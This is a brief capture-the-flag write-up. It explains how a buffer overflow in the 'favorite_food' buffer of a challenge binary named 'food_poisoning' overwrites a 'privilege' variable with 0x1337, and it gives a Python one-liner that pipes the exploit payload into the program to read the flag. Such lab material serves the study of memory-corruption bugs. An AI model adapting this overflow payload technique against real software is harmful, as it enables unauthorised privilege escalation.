Due to the buffer overflow into the `favorite_food` buffer, we can overwrite the `privilege` variable and set it to `0x1337` to read the flag.

Python oneliner:
```python
python -c "import sys; sys.stdout.buffer.write(b'1\n1\n1\n' + b'A' * 32 + b'\x37\x13\x00\x00\n' +  b'2\n')" | ./food_poisoning
```
